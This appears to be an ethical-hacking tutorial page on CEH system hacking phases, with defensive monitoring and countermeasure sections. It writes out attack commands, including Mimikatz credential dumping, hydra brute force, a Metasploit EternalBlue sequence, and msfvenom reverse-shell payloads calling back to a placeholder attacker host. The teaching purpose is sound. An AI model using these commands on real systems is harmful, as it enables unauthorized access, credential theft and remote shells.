System Hacking

System hacking is the third phase of ethical hacking involving gaining access to systems, escalating privileges, maintaining access, and covering tracks. It is one of the most critical phases in penetration testing.

Advanced Authorization Required
Critical Warning

System hacking techniques are highly sensitive and should ONLY be performed on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is a serious criminal offense under laws like the CFAA (US), Computer Misuse Act (UK), and IT Act (India). Always obtain proper authorization and operate within the defined scope of engagement.

System Hacking Phases

The four main phases of system hacking in the CEH methodology.

1. Gaining Access

Exploit vulnerabilities and crack passwords to gain initial access to the target system. Includes password attacks, exploitation, and social engineering.

2. Escalating Privileges

Elevate from a low-privilege user to administrator or root level access using privilege escalation techniques and exploits.

3. Maintaining Access

Install backdoors, rootkits, and trojans to ensure persistent access to the compromised system even after reboots.

4. Clearing Tracks

Remove evidence of the intrusion by clearing logs, modifying timestamps, and disabling auditing to avoid detection.

Detailed Methodology

Step-by-step breakdown of system hacking techniques.

1
Phase 1: Gaining Access

The initial phase focuses on bypassing authentication mechanisms and gaining an initial foothold on the target system.

  • Password Cracking — Brute force, dictionary attacks, rainbow tables, and rule-based attacks
  • Vulnerability Exploitation — Using known CVEs and exploits to gain unauthorized access
  • Social Engineering — Phishing, pretexting, baiting to trick users into revealing credentials
  • Default Credentials — Testing for default usernames and passwords on services
  • Pass the Hash — Using captured NTLM hashes without cracking them
2
Phase 2: Privilege Escalation

After gaining initial access, escalate to higher privilege levels to gain full control of the system.

  • Vertical Escalation — Moving from a regular user to administrator/root
  • Horizontal Escalation — Moving to another user account at the same privilege level
  • Kernel Exploits — Exploiting OS kernel vulnerabilities for root access
  • Misconfigured Services — Exploiting services running with elevated privileges
  • SUID/SGID Binaries — Abusing setuid/setgid binaries on Linux systems
  • Unquoted Service Paths — Exploiting unquoted paths in Windows services
  • DLL Hijacking — Replacing legitimate DLLs with malicious ones
3
Phase 3: Maintaining Access

Establish persistent access mechanisms that survive reboots, password changes, and security updates.

  • Backdoors — Install hidden access points that bypass normal authentication
  • Rootkits — Kernel-level or user-level tools that hide malicious activity
  • Trojans — Disguised malware that provides remote access
  • Web Shells — Server-side scripts providing remote command execution
  • Scheduled Tasks — Create persistent tasks that execute malicious code
  • Registry Modifications — Windows registry entries for persistence
4
Phase 4: Clearing Tracks

Remove all evidence of the intrusion to avoid detection by security teams and forensic investigators.

  • Log Manipulation — Clearing or modifying system, application, and security logs
  • Timestamp Manipulation — Changing file creation/modification times (timestomping)
  • Audit Trail Disabling — Disabling logging and auditing mechanisms
  • File Hiding — Using alternate data streams (ADS) or hidden attributes
  • Anti-Forensics — Techniques to defeat forensic analysis tools

Password Cracking

Techniques and tools for cracking passwords.

Brute Force Attack

Systematically tries every possible character combination until the correct password is found. Effective but very slow for complex passwords.

Slow but Reliable
Dictionary Attack

Uses a wordlist containing common passwords, phrases, and leaked credentials to attempt authentication against the target.

Fast with Good Wordlist
Rainbow Table Attack

Uses precomputed hash-to-password lookup tables for fast cracking. Defeated by salted hashes but very effective against unsalted ones.

Precomputed
Rule-Based Attack

Applies transformation rules to dictionary words (capitalize, append numbers, leetspeak substitution) to generate more password candidates.

Smart Mutations
Pass the Hash (PtH)

Uses captured NTLM password hashes to authenticate without knowing the plaintext password. Exploits Windows authentication protocols.

No Cracking Needed
Credential Stuffing

Uses previously breached username/password pairs to attempt login across multiple services, exploiting password reuse.

Leverages Breaches

Password Cracking Tools

Popular tools used for password recovery and cracking.

John the Ripper

Open-source password cracker supporting multiple hash types. Supports brute force, dictionary, and rule-based attacks.

john --wordlist=rockyou.txt hash.txt
Hashcat

World's fastest password recovery tool. GPU-accelerated with support for 300+ hash types and advanced attack modes.

hashcat -m 0 -a 0 hash.txt wordlist.txt
Hydra

Online password cracker supporting SSH, FTP, HTTP, RDP, SMB, MySQL, and 50+ other protocols for brute forcing.

hydra -l admin -P wordlist.txt ssh://target
Mimikatz

Windows post-exploitation tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory.

mimikatz # sekurlsa::logonpasswords
CeWL

Custom wordlist generator that spiders a target website and creates a tailored wordlist based on the site's content.

cewl -d 3 -m 5 http://target.com -w wordlist.txt
Ophcrack

Free Windows password cracker based on rainbow tables. Cracks LM and NTLM hashes with precomputed tables.

ophcrack

Privilege Escalation

Techniques for elevating access on compromised systems.

Linux Privilege Escalation
Escalating to root on Linux systems
Enumeration Commands
  • System info: uname -a , cat /etc/os-release
  • Current user: whoami , id
  • Sudo rights: sudo -l
  • SUID binaries: find / -perm -4000 -type f 2>/dev/null
  • Cron jobs: crontab -l , cat /etc/crontab
  • Writable dirs: find / -writable -type d 2>/dev/null
Common Techniques
  • Kernel exploits — Dirty COW, Dirty Pipe, PwnKit
  • SUID abuse — GTFOBins for SUID binary exploitation
  • Sudo misconfig — sudo -l for exploitable commands
  • Cron job abuse — Writable cron scripts running as root
  • PATH hijacking — Manipulating $PATH for command injection
  • Capabilities abuse — getcap -r / 2>/dev/null
  • NFS root squashing — Exploiting NFS misconfiguration
Automated Tools
./linpeas.sh
./linux-exploit-suggester.sh
Windows Privilege Escalation
Escalating to SYSTEM on Windows
Enumeration Commands
  • System info: systeminfo
  • Current user: whoami /priv
  • Network info: ipconfig /all
  • Running processes: tasklist /v
  • Installed software: wmic product get name
  • Scheduled tasks: schtasks /query /fo TABLE
  • Services: sc query state= all
Common Techniques
  • Unquoted service paths — Exploiting spaces in service executable paths
  • DLL hijacking — Replacing legitimate DLLs in search path
  • Token impersonation — JuicyPotato, PrintSpoofer, GodPotato
  • AlwaysInstallElevated — MSI packages installed as SYSTEM
  • Stored credentials — cmdkey /list
  • Registry autorun — Modifying autorun entries for privilege escalation
  • Weak service permissions — Reconfiguring services to execute payloads
Automated Tools
.\winPEAS.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

Exploitation Frameworks

Frameworks and tools used for system exploitation.

Metasploit Framework

The world's most used penetration testing framework. Contains thousands of exploits, payloads, auxiliary modules, and post-exploitation tools. Essential for every ethical hacker.

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
exploit
Payload Generation (msfvenom)

Standalone payload generator for creating custom shellcode and executables for various platforms and architectures.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php

Covering Tracks

How attackers remove evidence of intrusion (for defense understanding).

Linux Log Locations & Clearing
Understanding Linux logging for defense
Important Log Files
Log FileDescription
/var/log/auth.logAuthentication logs (SSH, sudo, login attempts)
/var/log/syslogGeneral system activity logs
/var/log/kern.logKernel messages and errors
/var/log/apache2/Apache web server logs
~/.bash_historyUser command history
/var/log/wtmpLogin records (use last to view)
Defense: What to Monitor
  • Set up centralized logging (syslog-ng, rsyslog, ELK Stack)
  • Enable log integrity monitoring with tools like OSSEC or Tripwire
  • Configure immutable logs that cannot be modified
  • Implement real-time alerts for suspicious log patterns

Key Event IDs to Monitor
  • 4624 — Successful logon
  • 4625 — Failed logon attempt
  • 4648 — Logon using explicit credentials
  • 4672 — Special privileges assigned to new logon
  • 4688 — A new process was created
  • 4720 — A user account was created
  • 1102 — Audit log was cleared
Defense: Best Practices
  • Enable advanced audit policies in Group Policy
  • Deploy Sysmon for detailed process and network monitoring
  • Forward logs to a SIEM (Splunk, ELK, Azure Sentinel)
  • Alert on Event ID 1102 (audit log cleared)

Countermeasures

How to defend systems against hacking attempts.

Authentication Defense

• Enforce strong password policies
• Implement Multi-Factor Authentication (MFA)
• Use account lockout policies
• Disable default accounts and credentials
• Deploy password managers
• Monitor for credential leaks

System Hardening

• Apply principle of least privilege
• Keep systems patched and updated
• Disable unnecessary services and ports
• Implement application whitelisting
• Enable full disk encryption
• Use EDR/XDR solutions

Detection & Monitoring

• Deploy SIEM solutions
• Enable centralized logging
• Use IDS/IPS systems
• Monitor for anomalous activity
• Conduct regular penetration tests
• Implement honeypots and deception technology
